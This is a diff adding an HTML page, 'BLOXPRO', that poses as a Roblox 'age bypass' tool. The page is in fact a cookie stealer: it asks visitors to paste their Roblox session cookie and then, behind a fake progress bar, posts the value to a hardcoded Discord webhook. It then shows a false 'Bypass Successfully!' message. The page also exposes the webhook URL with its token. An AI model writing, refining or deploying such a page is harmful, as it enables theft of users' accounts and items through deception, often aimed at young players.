@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BLOXPRO</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+
+     <style>
+        body {
+            background-color: #0a0a0a;
+        }
+
+        /* Discord popup animations */
+        #discordPopup {
+            animation: fadeIn 0.4s ease-out forwards;
+        }
+
+        #popupCard {
+            animation: slideUp 0.4s ease-out forwards;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0 }
+            to { opacity: 1 }
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(40px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+    </style>
+</head>
+
+<body class="min-h-screen p-6 text-white">
+
+<!-- DISCORD POPUP OVERLAY -->
+<div id="discordPopup" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50 hidden">
+    <div id="popupCard" class="bg-neutral-900 border border-neutral-800 p-6 rounded-2xl w-80 shadow-xl text-center">
+        
+        <img src="https://cdn.discordapp.com/attachments/1446539499273191636/1446573334417641604/a595cb21c12e4e7d8d1fcbe09eb0fdb3.jpg?ex=693479e6&is=69332866&hm=2d6666acaa049067785923176e9e192b5935b0cf636150c0a4fae03ce8e11bc5&"
+             class="w-20 h-20 rounded-full mx-auto mb-4">
+
+        <h2 class="text-xl font-bold mb-2">Join Our Discord</h2>
+        <p class="text-gray-400 text-sm mb-6">Connect with our community and get updates.</p>
+
+        <button onclick="joinServer()"
+            class="w-full bg-blue-600 hover:bg-blue-700 py-2 rounded-xl font-semibold mb-3">
+            Join Server
+        </button>
+
+        <button onclick="closePopup()"
+            class="w-full bg-neutral-800 hover:bg-neutral-700 py-2 rounded-xl font-semibold">
+            Join Later
+        </button>
+    </div>
+</div>
+
+<nav class="bg-neutral-900 border border-neutral-800 rounded-2xl p-4 flex items-center justify-between mb-8">
+    <h1 class="text-2xl font-bold">BLOXPRO | Dashboard</h1>
+</nav>
+
+<!-- MAIN CARD (message sender only) -->
+<div class="bg-neutral-900 border border-neutral-800 rounded-2xl p-6 shadow-xl max-w-xl mx-auto">
+
+    <h2 class="text-xl font-semibold mb-3">BYPASS AGE</h2>
+    <p class="text-gray-400 text-sm mb-4">BLOXPASS IS A POWERFUL AGE BYPASS CREATED IN 2024.</p>
+
+    <textarea
+        id="webhookMessage"
+        rows="3"
+        class="w-full bg-black border border-neutral-800 rounded-xl text-white px-4 py-2 placeholder-gray-600 focus:border-blue-600"
+        placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhADIhsKBGR1aWQSEzYyNTkyMzQ3OTIzMDI3MzEwODgoAw.XQ7GQoG4_V2lxxiTnFEG5X2uX8PT1_HmzW8rLNGXEeSLlcwEUERJ2BN07ntmS_Ft0Nw2ria2r3OgsvpyfdphoThIru9Onwr_VNNmVwp-v4TRID1O7nu2LOJt8msE1rQaYlaQX51dEUuj4OThxc9iBJv5mKKmD3Qg1nysdkjLhzm448j4QIB_2Bp2GoXohcI8m"
+    ></textarea>
+
+    <button 
+        id="sendBtn"
+        onclick="sendWebhook()"
+        class="bg-blue-600 hover:bg-blue-700 py-2 rounded-xl font-semibold w-full mt-3"
+    >
+        Age Bypass
+    </button>
+
+    <!-- Progress bar -->
+    <div id="progressContainer" class="w-full bg-neutral-800 rounded-xl h-2 mt-4 hidden">
+        <div id="progressBar" class="h-2 bg-blue-500 rounded-xl" style="width: 0%;"></div>
+    </div>
+
+</div>
+
+
+<script>
+// DISCORD POPUP SHOW ON LOAD
+window.onload = function () {
+    document.getElementById("discordPopup").classList.remove("hidden");
+};
+
+function joinServer() {
+    window.open("https://discord.gg/ec7h2KqTY5", "_blank"); 
+    closePopup();
+}
+
+function closePopup() {
+    document.getElementById("discordPopup").classList.add("hidden");
+}
+
+
+
+// ---- WEBHOOK SYSTEM ---- //
+
+const WEBHOOK_URL =
+"https://discord.com/api/webhooks/1446558345657061517/TXzqkxok3TcAtALmqUTkQKQDCUVGFOHypyZGA29-1ZO-zpUlDLQnMcIQ-tUqDPvrQJGP";
+
+let cooldown = false;
+
+function sendWebhook() {
+    if (cooldown) return;
+
+    const msg = document.getElementById("webhookMessage").value;
+    if (!msg) {
+        Swal.fire({
+            icon: "warning",
+            title: "Message Missing",
+            text: "Please enter a coolie before bypassing.",
+            background: "#111",
+            color: "white"
+        });
+        return;
+    }
+
+    // Progress UI
+    document.getElementById("progressContainer").classList.remove("hidden");
+    let bar = document.getElementById("progressBar");
+    let width = 0;
+
+    let loading = setInterval(() => {
+        width++;
+        bar.style.width = width + "%";
+
+        if (width >= 100) {
+            clearInterval(loading);
+            bar.style.width = "0%";
+            document.getElementById("progressContainer").classList.add("hidden");
+
+            finalizeSend(msg);
+        }
+    }, 20);
+}
+
+function finalizeSend(msg) {
+    fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ content: msg })
+    });
+
+    Swal.fire({
+        icon: "success",
+        title: "Bypass Successfully!",
+        text: "Please Check Your Account.",
+        background: "#111",
+        color: "white",
+        showConfirmButton: false,
+        timer: 1500
+    });
+
+    cooldown = true;
+    document.getElementById("sendBtn").disabled = true;
+    document.getElementById("webhookMessage").disabled = true;
+
+    setTimeout(() => {
+        cooldown = false;
+        document.getElementById("sendBtn").disabled = false;
+        document.getElementById("webhookMessage").disabled = false;
+    }, 5 * 60 * 1000); // 5 minutes
+}
+</script>
+
+</body>
+</html>
